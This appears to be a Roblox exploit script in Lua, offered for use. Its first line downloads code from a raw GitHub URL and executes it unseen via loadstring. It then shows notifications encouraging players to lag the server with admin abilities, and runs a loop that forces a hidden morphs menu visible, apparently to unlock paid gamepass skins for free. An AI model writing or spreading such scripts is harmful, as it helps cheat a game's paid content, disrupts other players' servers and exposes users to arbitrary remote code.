loadstring(game:HttpGet("https://raw.githubusercontent.com/d74420150-byte/Ee/main/main5.lua"))()
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("SendNotification", {
    Title = "Tuff Notice",
    Text = "Characters with admin abilities: 00n7, 1x4",
    Duration = 5
})
task.wait(1)
StarterGui:SetCore("SendNotification", {
    Title = "Free gamepass skins 🤑",
    Text = "go lag the server with admin abilities 1x4",
    Duration = 5
})
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local function findFrame()
    local playerGui = player:WaitForChild("PlayerGui")
    local morphsGui = playerGui:WaitForChild("MorphsGui")
    return morphsGui:WaitForChild("Frame")
end
local function makeEverythingInsideVisible(targetFrame)
    if not targetFrame or not targetFrame:IsDescendantOf(game) then
        return
    end
    for _, descendant in ipairs(targetFrame:GetDescendants()) do
        pcall(function()
            if descendant:IsA("GuiObject") then
                descendant.Visible = true
            end
        end)
    end
end
local function mainLoop()
    while task.wait(0.1) do
        local success, frame = pcall(findFrame)
        if success and frame then
            makeEverythingInsideVisible(frame)
        end
    end
end
task.spawn(mainLoop)